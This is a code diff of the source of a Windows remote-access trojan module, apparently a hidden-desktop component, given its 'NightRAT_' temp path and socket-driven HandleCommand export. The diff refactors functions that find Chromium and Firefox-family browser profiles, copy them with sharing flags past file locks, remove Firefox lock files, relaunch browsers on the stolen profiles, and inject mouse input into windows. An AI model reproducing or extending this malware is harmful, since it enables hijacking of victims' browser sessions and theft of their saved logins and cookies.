@@ -1142,26 +1142,7 @@ static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
     return best;
 }
 
-static HWND smart_window_from_point(POINT pt) {
-    const int WS_EX_TRANSPARENT_FLAG = 0x00000020;
-
-    for (int attempt = 0; attempt < 4; attempt++) {
-        HWND hwnd = WindowFromPoint(pt);
-        if (!hwnd) return NULL;
-        wchar_t cls[256] = {0};
-        if (GetClassNameW(hwnd, cls, 256)) {
-            if (wcscmp(cls, L"UserOOBEWindowClass") == 0 || wcscmp(cls, L"WorkerW") == 0 || wcscmp(cls, L"Progman") == 0) {
-                LONG_PTR ex = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
-                if ((ex & WS_EX_TRANSPARENT_FLAG) == 0) {
-                    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, ex | WS_EX_TRANSPARENT_FLAG);
-                }
-                continue;
-            }
-        }
-        return hwnd;
-    }
-    return WindowFromPoint(pt);
-}
+static HWND smart_window_from_point(POINT pt);
 
 static BOOL CALLBACK FindWindowAtPointEnum(HWND hwnd, LPARAM lParam) {
     struct Param {
@@ -1200,6 +1181,27 @@ static HWND get_topmost_window_at_point(POINT pt) {
         return param.result;
     }
     return smart_window_from_point(pt);
+}
+
+static HWND smart_window_from_point(POINT pt) {
+    const int WS_EX_TRANSPARENT_FLAG = 0x00000020;
+
+    for (int attempt = 0; attempt < 4; attempt++) {
+        HWND hwnd = WindowFromPoint(pt);
+        if (!hwnd) return NULL;
+        wchar_t cls[256] = {0};
+        if (GetClassNameW(hwnd, cls, 256)) {
+            if (wcscmp(cls, L"UserOOBEWindowClass") == 0 || wcscmp(cls, L"WorkerW") == 0 || wcscmp(cls, L"Progman") == 0) {
+                LONG_PTR ex = GetWindowLongPtrW(hwnd, GWL_EXSTYLE);
+                if ((ex & WS_EX_TRANSPARENT_FLAG) == 0) {
+                    SetWindowLongPtrW(hwnd, GWL_EXSTYLE, ex | WS_EX_TRANSPARENT_FLAG);
+                }
+                continue;
+            }
+        }
+        return hwnd;
+    }
+    return WindowFromPoint(pt);
 }
 
 static HWND target_window_from_screen_point(POINT screenPt) {
@@ -1513,6 +1515,7 @@ static void input_loop() {
             if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                 if (!hRoot) hRoot = hwnd;
 
@@ -1611,6 +1614,7 @@ static void input_loop() {
             if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                 if (!hRoot) hRoot = hwnd;
 
@@ -1669,6 +1673,10 @@ static void input_loop() {
             if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                 if (!hRoot) hRoot = hwnd;
 
@@ -1736,14 +1744,121 @@ static string wstring_to_utf8(const wstring& wstr) {
     return res;
 }
 
+static wstring get_app_path(const wstring& appName) {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
+    wstring path;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        wchar_t buffer[MAX_PATH];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            path = buffer;
+        }
+        RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    return path;
+}
+
+static wstring get_browser_profile_path(const wstring& browserName) {
+    wchar_t szPath[MAX_PATH];
+    if (browserName == L"Opera" || browserName == L"Opera GX") {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
+        else path += L"\\Opera Software\\Opera GX Stable";
+        return path;
+    } else {
+        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        if (browserName == L"Google Chrome") {
+            path += L"\\Google\\Chrome\\User Data";
+        } else if (browserName == L"Microsoft Edge") {
+            path += L"\\Microsoft\\Edge\\User Data";
+        } else if (browserName == L"Brave") {
+            path += L"\\BraveSoftware\\Brave-Browser\\User Data";
+        } else {
+            return L"";
+        }
+        return path;
+    }
+}
+
+static wstring get_gecko_profile_path(const wstring& browserName) {
+    wchar_t szPath[MAX_PATH];
+    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+
+    wstring path = szPath;
+    if (browserName == L"Firefox") {
+        path += L"\\Mozilla\\Firefox";
+    } else if (browserName == L"Waterfox") {
+        path += L"\\Waterfox";
+    } else if (browserName == L"LibreWolf") {
+        path += L"\\LibreWolf";
+    } else {
+        return L"";
+    }
+    return path;
+}
+
+static const vector<wstring> SKIPPED_PROFILE_DIRS = {
+    L"Cache", L"Code Cache", L"GPUCache", L"ShaderCache", L"DawnCache",
+    L"GrShaderCache", L"Snapshots", L"CrashReports", L"Crash Reports", L"Crashpad",
+    L"BrowserMetrics", L"BrowserMetrics-spare", L"component_crx_cache",
+    L"optimization_guide_model_downloads", L"Safe Browsing", L"FileTypePolicies",
+    L"PepperFlash", L"WidevineCdm", L"MEIPreload", L"OriginTrials",
+    L"cache2", L"startupCache", L"shader-cache", L"thumbnails",
+    L"Media Cache", L"crash_reporter"
+};
+
+static bool should_skip_dir(const wstring& name) {
+    for (const auto& skip : SKIPPED_PROFILE_DIRS) {
+        if (_wcsicmp(name.c_str(), skip.c_str()) == 0) return true;
+    }
+    return false;
+}
+
+static bool CopyFileWithSharing(const wchar_t* src, const wchar_t* dst) {
+    HANDLE hSrc = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hSrc == INVALID_HANDLE_VALUE) return false;
+
+    HANDLE hDst = CreateFileW(dst, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hDst == INVALID_HANDLE_VALUE) {
+        CloseHandle(hSrc);
+        return false;
+    }
+
+    const DWORD bufSize = 65536;
+    vector<char> buffer(bufSize);
+    DWORD bytesRead = 0;
+    DWORD bytesWritten = 0;
+    bool success = true;
+
+    while (ReadFile(hSrc, buffer.data(), bufSize, &bytesRead, NULL) && bytesRead > 0) {
+        if (!WriteFile(hDst, buffer.data(), bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+            success = false;
+            break;
+        }
+    }
+
+    CloseHandle(hSrc);
+    CloseHandle(hDst);
+    return success;
+}
+
 // ============================================================================
 //  GECKO (FIREFOX) PROFILE RESOLUTION HELPERS
 // ============================================================================
 
-/**
- * Fallback scanner that searches the Gecko profile directory for any ".default-release"
- * or ".default" directories if the profiles.ini parsing fails or is missing.
- */
 static wstring find_gecko_profile_fallback(const wstring& geckoUserDataDir) {
     wstring profilesPath = geckoUserDataDir + L"\\Profiles";
     wstring fallbackDir;
@@ -1773,11 +1888,6 @@ struct IniSection {
     vector<pair<wstring, wstring>> kvs;
 };
 
-/**
- * Resolves the active default Gecko (Firefox) profile directory by parsing the
- * UTF-8 profiles.ini file. It handles modern Firefox configurations including
- * "[Install...]" default mapping paths and fallback structures.
- */
 static wstring resolve_gecko_profile_from_ini(const wstring& geckoUserDataDir) {
     wstring iniPath = geckoUserDataDir + L"\\profiles.ini";
     FILE* f = _wfopen(iniPath.c_str(), L"r, ccs=UTF-8");
@@ -1927,89 +2037,6 @@ static wstring resolve_gecko_profile_from_ini(const wstring& geckoUserDataDir) {
     return L"";
 }
 
-static wstring get_app_path(const wstring& appName) {
-    HKEY hKey;
-    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
-    wstring path;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        wchar_t buffer[MAX_PATH];
-        DWORD size = sizeof(buffer);
-        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
-            path = buffer;
-        }
-        RegCloseKey(hKey);
-    }
-    if (path.empty()) {
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            wchar_t buffer[MAX_PATH];
-            DWORD size = sizeof(buffer);
-            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
-                path = buffer;
-            }
-            RegCloseKey(hKey);
-        }
-    }
-    return path;
-}
-
-static wstring get_browser_profile_path(const wstring& browserName) {
-    wchar_t szPath[MAX_PATH];
-    if (browserName == L"Opera" || browserName == L"Opera GX") {
-        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
-        wstring path = szPath;
-        if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
-        else path += L"\\Opera Software\\Opera GX Stable";
-        return path;
-    } else {
-        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
-        wstring path = szPath;
-        if (browserName == L"Google Chrome") {
-            path += L"\\Google\\Chrome\\User Data";
-        } else if (browserName == L"Microsoft Edge") {
-            path += L"\\Microsoft\\Edge\\User Data";
-        } else if (browserName == L"Brave") {
-            path += L"\\BraveSoftware\\Brave-Browser\\User Data";
-        } else {
-            return L"";
-        }
-        return path;
-    }
-}
-
-static wstring get_gecko_profile_path(const wstring& browserName) {
-    wchar_t szPath[MAX_PATH];
-    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
-
-    wstring path = szPath;
-    if (browserName == L"Firefox") {
-        path += L"\\Mozilla\\Firefox";
-    } else if (browserName == L"Waterfox") {
-        path += L"\\Waterfox";
-    } else if (browserName == L"LibreWolf") {
-        path += L"\\LibreWolf";
-    } else {
-        return L"";
-    }
-    return path;
-}
-
-static const vector<wstring> SKIPPED_PROFILE_DIRS = {
-    L"Cache", L"Code Cache", L"GPUCache", L"ShaderCache", L"DawnCache",
-    L"GrShaderCache", L"Snapshots", L"CrashReports", L"Crash Reports", L"Crashpad",
-    L"BrowserMetrics", L"BrowserMetrics-spare", L"component_crx_cache",
-    L"optimization_guide_model_downloads", L"Safe Browsing", L"FileTypePolicies",
-    L"PepperFlash", L"WidevineCdm", L"MEIPreload", L"OriginTrials",
-    L"cache2", L"startupCache", L"shader-cache", L"thumbnails",
-    L"Media Cache", L"crash_reporter"
-};
-
-static bool should_skip_dir(const wstring& name) {
-    for (const auto& skip : SKIPPED_PROFILE_DIRS) {
-        if (_wcsicmp(name.c_str(), skip.c_str()) == 0) return true;
-    }
-    return false;
-}
-
 static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<pair<wstring, wstring>>& tasks) {
     if (!fs::exists(src)) return;
     try { fs::create_directories(dst); } catch (...) {}
@@ -2028,34 +2055,6 @@ static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<
             }
         }
     } catch (...) {}
-}
-
-static bool CopyFileWithSharing(const wchar_t* src, const wchar_t* dst) {
-    HANDLE hSrc = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hSrc == INVALID_HANDLE_VALUE) return false;
-
-    HANDLE hDst = CreateFileW(dst, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hDst == INVALID_HANDLE_VALUE) {
-        CloseHandle(hSrc);
-        return false;
-    }
-
-    const DWORD bufSize = 65536;
-    vector<char> buffer(bufSize);
-    DWORD bytesRead = 0;
-    DWORD bytesWritten = 0;
-    bool success = true;
-
-    while (ReadFile(hSrc, buffer.data(), bufSize, &bytesRead, NULL) && bytesRead > 0) {
-        if (!WriteFile(hDst, buffer.data(), bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
-            success = false;
-            break;
-        }
-    }
-
-    CloseHandle(hSrc);
-    CloseHandle(hDst);
-    return success;
 }
 
 static bool copy_profile_parallel(const wstring& src_dir, const wstring& dst_dir, const string& label) {
@@ -2306,50 +2305,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring profilePath;
                     wstring profileDir = L"Default";
 
-                    if (isGecko) {
-                        wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
-                        if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
-                            send_error("Gecko User Data directory not found.");
-                            return;
-                        }
-
-                        // Resolve active profile directory using ini or fallback
-                        wstring activeProfileSrc = resolve_gecko_profile_from_ini(sourceUserData);
-                        if (activeProfileSrc.empty() || !fs::exists(activeProfileSrc)) {
-                            activeProfileSrc = find_gecko_profile_fallback(sourceUserData);
-                        }
-
-                        if (activeProfileSrc.empty() || !fs::exists(activeProfileSrc)) {
-                            send_error("Active Gecko Profile directory not found.");
-                            return;
-                        }
-
-                        if (copyProfile) {
-                            wchar_t tempPath[MAX_PATH];
-                            GetTempPathW(MAX_PATH, tempPath);
-                            wstring tempProfileRoot = tempPath;
-                            tempProfileRoot += L"NightRAT_";
-                            tempProfileRoot += exeName;
-                            tempProfileRoot += L"_Profile";
-
-                            try {
-                                if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
-                            } catch (...) {}
-
-                            // Copy only the resolved active profile's files directly into tempProfileRoot
-                            if (!copy_profile_parallel(activeProfileSrc, tempProfileRoot, "Profiller kopyalanıyor")) {
-                                send_error("Failed to copy Gecko profile.");
-                                return;
-                            }
-
-                            profilePath = tempProfileRoot;
+                    if (copyProfile) {
+                        wstring sourceUserData;
+                        if (isGecko) {
+                            sourceUserData = get_gecko_profile_path(wRequestedPath);
                         } else {
-                            // If copyProfile is false, we launch with the resolved original profile directly
-                            profilePath = activeProfileSrc;
+                            sourceUserData = get_browser_profile_path(wRequestedPath);
                         }
-
-                    } else if (copyProfile) {
-                        wstring sourceUserData = get_browser_profile_path(wRequestedPath);
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("User Data directory not found.");
@@ -2377,23 +2339,47 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             return;
                         }
 
-                        WIN32_FIND_DATAW findData;
-                        HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
-                        if (hFind != INVALID_HANDLE_VALUE) {
-                            do {
-                                wstring name = findData.cFileName;
-                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                    profileDir = name;
-                                    break;
-                                }
-                            } while (FindNextFileW(hFind, &findData));
-                            FindClose(hFind);
+                        if (isGecko) {
+                            wstring profilesPath = sourceUserData + L"\\Profiles";
+                            wstring profileSubDir;
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW((profilesPath + L"\\*").c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    wstring name = findData.cFileName;
+                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                        name != L"." && name != L"..") {
+                                        profileSubDir = name;
+                                        break;
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
+
+                            if (!profileSubDir.empty()) {
+                                profilePath = tempProfileRoot + L"\\Profiles\\" + profileSubDir;
+                            } else {
+                                profilePath = tempProfileRoot;
+                            }
+                        } else {
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    wstring name = findData.cFileName;
+                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                        (name == L"Default" || name.find(L"Profile ") == 0)) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
+                            profilePath = tempProfileRoot;
                         }
-                        profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!copyProfile && (isGecko || wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2411,7 +2397,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring args;
                     if (isGecko) {
-                        args = L" -no-remote -allow-downgrade";
+                        args = L" -no-remote";
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
@@ -2483,17 +2469,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         try {
                             if (isGecko) {
                                 fs::create_directories(profilePath);
-                                if (copyProfile) {
-                                    fs::path userJsPath = fs::path(profilePath) / L"user.js";
-                                    FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
-                                    if (f) {
-                                        fputs("user_pref(\"gfx.webrender.all\", false);\n", f);
-                                        fputs("user_pref(\"gfx.webrender.software\", true);\n", f);
-                                        fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
-                                        fputs("user_pref(\"layers.acceleration.force-enabled\", false);\n", f);
-                                        fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
-                                        fclose(f);
-                                    }
+                                fs::path userJsPath = fs::path(profilePath) / L"user.js";
+                                FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
+                                if (f) {
+                                    fputs("user_pref(\"gfx.webrender.force-disabled\", true);\n", f);
+                                    fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
+                                    fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
+                                    fclose(f);
                                 }
                                 fs::remove(fs::path(profilePath) / L"parent.lock");
                                 fs::remove(fs::path(profilePath) / L"lock");
